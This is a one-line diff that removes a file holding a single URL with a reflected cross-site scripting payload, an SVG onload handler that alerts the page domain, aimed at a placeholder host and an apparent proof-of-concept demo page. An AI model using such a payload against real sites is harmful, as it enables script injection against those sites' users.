@@ -1,1 +1,0 @@
-http://OUR_IP/index.php/<svg/onload=alert(document.domain)>?target=http://p0c.geekboy.ninja/rxss-demo.php
